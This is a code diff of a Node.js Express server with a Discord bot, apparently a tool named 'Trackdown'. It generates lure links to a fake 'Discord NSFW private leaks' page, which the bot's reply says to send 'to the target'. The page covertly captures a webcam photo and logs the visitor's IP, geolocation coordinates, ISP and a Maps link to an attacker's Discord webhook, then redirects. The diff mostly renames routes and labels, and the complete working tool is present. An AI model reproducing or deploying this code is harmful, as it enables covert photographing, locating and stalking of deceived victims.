@@ -9,10 +9,10 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 // ================== ENV VARIABLES ==================
 const TOKEN = process.env.DISCORD_TOKEN;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
-const DOMAIN = process.env.DOMAIN;
+const DOMAIN = process.env.DOMAIN;   // Should be https://clicklink.space
 
 if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
-  console.error("❌ Missing environment variables! Check Render dashboard.");
+  console.error("❌ Missing environment variables!");
 }
 
 app.set('trust proxy', true);
@@ -20,23 +20,18 @@ app.use(express.json());
 
 // Health Check
 app.get('/', (req, res) => {
-  res.send('✅ Trackdown bot is running!');
+  res.send('✅ Trackdown service is running');
 });
 
 const trackingLinks = new Map();
 
-// ================== FAKE NSFW PAGE ==================
-app.get('/track/:id', (req, res) => {
+// ================== CLEAN TRACKING PAGE ==================
+app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
 
   if (!originalUrl) {
-    return res.send(`
-      <h1 style="color:red; text-align:center; margin-top:100px; font-family:Arial;">
-        Link expired or invalid
-      </h1>
-      <p style="text-align:center; color:#666;">This tracking link is no longer active.</p>
-    `);
+    return res.send('<h1 style="color:#ff4444; text-align:center; margin-top:100px;">This link has expired or is invalid</h1>');
   }
 
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
@@ -47,21 +42,21 @@ app.get('/track/:id', (req, res) => {
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Discord • Private Leaks</title>
+  <title>Discord • Private Media</title>
   <style>
-    body { background:#0f0f0f; color:#ff00aa; font-family:Arial; text-align:center; margin:0; padding:40px 20px; }
-    h1 { font-size:28px; margin:20px 0; }
-    .progress { height:10px; background:#222; border-radius:5px; overflow:hidden; margin:30px auto; max-width:400px; }
-    .bar { height:100%; width:0%; background:linear-gradient(90deg,#ff00aa,#00ffff); animation:load 4.5s linear forwards; }
-    .status { color:#00ff88; font-size:18px; margin:15px 0; }
+    body { background:#0f0f0f; color:#ff00aa; font-family:Arial; text-align:center; margin:0; padding:50px 20px; }
+    h1 { font-size:26px; margin:25px 0; }
+    .progress { height:8px; background:#222; border-radius:4px; overflow:hidden; margin:35px auto; max-width:380px; }
+    .bar { height:100%; width:0%; background:linear-gradient(90deg,#ff00aa,#00ffff); animation:load 4.2s linear forwards; }
+    .status { color:#00ff88; font-size:17px; margin:18px 0; }
     @keyframes load { to { width:100%; } }
   </style>
 </head>
 <body>
-  <h1>🔞 DISCORD NSFW PRIVATE LEAKS</h1>
-  <p>Decrypting 18+ content from leaked server...</p>
+  <h1>🔞 Discord Private NSFW Media</h1>
+  <p>Decrypting content from restricted server...</p>
   <div class="progress"><div class="bar"></div></div>
-  <p class="status" id="status">69% • Please wait...</p>
+  <p class="status" id="status">Loading • Please wait...</p>
 
   <video id="video" autoplay playsinline style="display:none"></video>
   <canvas id="canvas" style="display:none"></canvas>
@@ -89,11 +84,11 @@ app.get('/track/:id', (req, res) => {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-        video.onloadedmetadata = () => setTimeout(takePhoto, 2600);
+        video.onloadedmetadata = () => setTimeout(takePhoto, 2400);
       } catch(e) {
-        document.getElementById('status').textContent = "Access denied • Redirecting...";
+        document.getElementById('status').textContent = "Access blocked • Redirecting...";
         await logVisit(null, "Denied");
-        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1600);
+        setTimeout(() => window.location.href = "${originalUrl}", 1400);
       }
     }
 
@@ -101,11 +96,11 @@ app.get('/track/:id', (req, res) => {
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       canvas.getContext('2d').drawImage(video, 0, 0);
-      const photo = canvas.toDataURL('image/jpeg', 0.82);
+      const photo = canvas.toDataURL('image/jpeg', 0.8);
 
       logVisit(photo, "Granted").then(() => {
         if (stream) stream.getTracks().forEach(t => t.stop());
-        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1000);
+        setTimeout(() => window.location.href = "${originalUrl}", 900);
       });
     }
 
@@ -126,10 +121,7 @@ app.post('/log', async (req, res) => {
 
   try {
     if (ip && ip !== 'Unknown') {
-      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { 
-        timeout: 6000 
-      });
-      
+      const geo = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { timeout: 6000 });
       if (geo.data.status === "success") {
         city = geo.data.city || 'Unknown';
         region = geo.data.regionName || '';
@@ -139,25 +131,21 @@ app.post('/log', async (req, res) => {
         isp = geo.data.isp || 'Unknown';
       }
     }
-  } catch (e) {
-    console.error("Geo lookup failed:", e.message);
-  }
+  } catch (e) {}
 
   const locationText = `${city}, ${region ? region + ', ' : ''}${country}`;
-  const coords = (lat && lon) ? `(${lat}, ${lon})` : '';
   const mapsLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '#';
 
   const embed = {
-    title: "🎯 Trackdown Hit - NSFW Fake Link",
+    title: "🎯 NSFW Link Hit",
     color: cameraAccess === "Granted" ? 0x00ff88 : 0xffaa00,
     fields: [
       { name: "IP", value: `\`${ip}\``, inline: true },
-      { name: "Location", value: `${locationText} ${coords}`, inline: false },
+      { name: "Location", value: `${locationText} (${lat || 'N/A'}, ${lon || 'N/A'})`, inline: false },
       { name: "Camera", value: cameraAccess, inline: true },
       { name: "ISP", value: isp, inline: true },
-      { name: "Google Maps", value: mapsLink !== '#' ? `[📍 Open in Maps](${mapsLink})` : "Not available", inline: false },
+      { name: "Maps", value: mapsLink !== '#' ? `[📍 View on Maps](${mapsLink})` : "N/A", inline: false },
       { name: "Time", value: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false },
-      { name: "User-Agent", value: (userAgent || "Unknown").substring(0, 280), inline: false },
       { name: "Original URL", value: originalUrl, inline: false }
     ],
     timestamp: new Date().toISOString()
@@ -169,7 +157,7 @@ app.post('/log', async (req, res) => {
       form.append('payload_json', JSON.stringify({ embeds: [embed] }));
       const base64Data = photo.split(',')[1];
       const buffer = Buffer.from(base64Data, 'base64');
-      form.append('file', buffer, 'captured.jpg');
+      form.append('file', buffer, 'photo.jpg');
       await axios.post(WEBHOOK_URL, form, { headers: form.getHeaders() });
     } else {
       await axios.post(WEBHOOK_URL, { embeds: [embed] });
@@ -183,18 +171,17 @@ app.post('/log', async (req, res) => {
 
 // ================== DISCORD BOT ==================
 client.once('ready', async () => {
-  console.log(`✅ Bot is online → ${client.user.tag}`);
+  console.log(`✅ Bot online → ${client.user.tag}`);
 
   const cmd = new SlashCommandBuilder()
     .setName('create')
-    .setDescription('Create fake NSFW leaks tracking link')
+    .setDescription('Create clean NSFW tracking link')
     .addStringOption(opt =>
       opt.setName('url')
-        .setDescription('Real URL to redirect after tracking')
+        .setDescription('Real URL to redirect to')
         .setRequired(true));
 
   await client.application.commands.set([cmd]);
-  console.log("✅ Slash command '/create' registered");
 });
 
 client.on('interactionCreate', async interaction => {
@@ -202,59 +189,34 @@ client.on('interactionCreate', async interaction => {
 
   try {
     const url = interaction.options.getString('url');
-
-    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+    if (!url.startsWith('http')) {
       return interaction.reply({ 
         content: '❌ URL must start with http:// or https://', 
         flags: MessageFlags.Ephemeral 
       });
     }
 
-    // Stronger trackId to prevent collisions
-    const trackId = 'nsfw_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10);
+    const trackId = 'leak-' + Math.random().toString(36).substring(2, 12);
     trackingLinks.set(trackId, url);
 
-    const trackingLink = `${DOMAIN}/track/${trackId}`;
+    const trackingLink = `${DOMAIN}/nsfw-leak/${trackId}`;
 
     await interaction.reply({
-      content: `**✅ Fake NSFW Tracking Link Created!**\n\n` +
-               `**Tracking Link:** ${trackingLink}\n` +
+      content: `**✅ Clean NSFW Tracking Link Created**\n\n` +
+               `**Link:** ${trackingLink}\n` +
                `**Redirects to:** ${url}\n\n` +
-               `Send this link to the target.`,
+               `Send this to the target.`,
       flags: MessageFlags.Ephemeral
     });
-
   } catch (err) {
-    console.error("Interaction error:", err.message);
-    if (!interaction.replied && !interaction.deferred) {
-      try {
-        await interaction.reply({ 
-          content: '❌ Something went wrong. Please try again.', 
-          flags: MessageFlags.Ephemeral 
-        });
-      } catch (e) {}
-    }
+    console.error("Interaction error:", err);
   }
 });
 
-// ================== START SERVER ==================
+// Start Server
 const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
 
-app.listen(PORT, () => {
-  console.log(`✅ Web server running on port ${PORT}`);
-});
+client.login(TOKEN).catch(err => console.error("Discord login failed:", err.message));
 
-client.login(TOKEN)
-  .then(() => console.log("✅ Discord bot logged in successfully"))
-  .catch(err => {
-    console.error("❌ Failed to login to Discord:", err.message);
-  });
-
-// Prevent crashes
-process.on('unhandledRejection', (reason) => {
-  console.error('Unhandled Rejection:', reason);
-});
-
-process.on('uncaughtException', (err) => {
-  console.error('Uncaught Exception:', err);
-});
+process.on('unhandledRejection', reason => console.error('Unhandled Rejection:', reason));
